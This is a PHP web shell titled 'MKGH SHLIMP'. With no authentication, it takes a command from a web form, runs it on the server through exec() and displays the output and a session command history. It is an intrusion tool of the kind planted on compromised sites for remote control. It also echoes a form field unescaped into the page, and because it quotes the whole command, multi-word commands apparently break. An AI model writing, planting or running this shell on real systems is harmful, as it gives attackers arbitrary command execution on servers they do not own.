<?php

session_start();

/**
 * Displays the output in a formatted way.
 *
 * @param array $output The output lines to display.
 *
 * @return void
 */
function showOutput(array $output): void {
    foreach ($output as $line) {
        echo htmlspecialchars($line) . "\n";
    }
}

/**
 * Executes a shell command and returns the output.
 *
 * @param string $command The command to execute.
 *
 * @return array The output lines from the command.
 */
function executeCommand(string $command): array {
    $output = [];
    $retCode = 0;

    exec($command, $output, $retCode);

    return $output;
}

/**
 * Shows the help message.
 *
 * @return void
 */
function showHelper(): void {
    $helpText = [
        "Available commands:",
        "help    - Show this help message",
        "history - Show command history",
        "clear   - Clear command history",
        "exit    - End the session",
        "Other commands will be executed on the server."
    ];

    showOutput($helpText);
}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>6D 68 67 61</title>
    </head>
    <body>
        <h1>MKGH SHLIMP</h1>

        <form method="POST">
            <input type="text" name="cmd" placeholder="Enter command here...">
            <input type="text" name="current_dir" placeholder="Current directory..." value="<?= $_POST['current_dir'] ?? getcwd(); ?>">
            <input type="submit" name="execute" value="RUN!">
        </form>

        <textarea name="output" rows="30" cols="30" readonly>
            <?php
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    $input = $_POST['cmd'] ?? '';
                    $currentDir = $_POST['current_dir'] ?? getcwd();
                    $command = sprintf("cd %s && %s", escapeshellarg($currentDir), escapeshellarg($input));

                    if (!empty($input)) {
                        switch ($input) {
                            case 'history':
                                showOutput($_SESSION['history'] ?? []);
                                break;

                            case 'clear':
                                $_SESSION['history'] = [];
                                echo 'History cleared.';
                                break;

                            case 'exit':
                                echo 'Session ended.';
                                session_destroy();
                                break;

                            case 'help':
                                showHelper();
                                break;

                            default:
                                showOutput(executeCommand($command));
                                break;
                        }

                        $_SESSION['history'][] = $command;
                    }
                }
            ?>
        </textarea>

        <textarea name="history" rows="30" cols="30" readonly>
            <?php showOutput($_SESSION['history'] ?? []); ?>
        </textarea>
    </body>
</html>
